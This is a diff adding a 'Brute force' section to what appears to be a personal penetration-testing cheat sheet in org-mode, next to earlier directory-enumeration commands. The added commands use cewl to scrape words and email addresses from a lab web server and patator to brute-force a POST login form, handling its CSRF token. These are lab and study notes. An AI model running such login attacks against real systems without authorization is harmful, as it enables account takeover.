@@ -46,3 +46,31 @@ feroxbuster --url http://$IP/IDENTIFIEDDIRECTORY --wordlist `fzf-wordlists` --ex
 
 gobuster dir -u 192.168.50.20 -w `fzf-wordlists` -t 5 -x html,php
 #+end_src
+
+* Brute force
+** Create wordlist
+#+BEGIN_SRC bash
+cewl -d 2 --min_word_length 5 -w passwords.txt http://192.168.212.11
+#+END_SRC
+
+** Create wordlist (E-Mails only)
+#+BEGIN_SRC bash
+cewl -d 2 --min_word_length 5 --no-words --email --email_file emails1.txt http://192.168.212.11
+#+END_SRC
+
+** Brute force POST Login Form
+#+begin_src bash
+patator http_fuzz \
+	url=http://192.168.212.11/project/index.php/login \
+	body='login[_csrf_token]=_CSRF_&login[email]=FILE0&login[password]=FILE1&http_referer=""' \
+	0="./emails.txt" \
+	1="./passwords.txt" \
+	proxy="127.0.0.1:8080" \
+	proxy_type="http" \
+	method=POST \
+	accept_cookie=1 \
+	follow=1 \
+	before_urls="http://192.168.212.11/project/index.php/login" \
+	before_egrep='_CSRF_:_csrf_token\]" value="(.*?)"' \
+	-x ignore:fgrep="No match for Email and/or Password"
+#+end_src
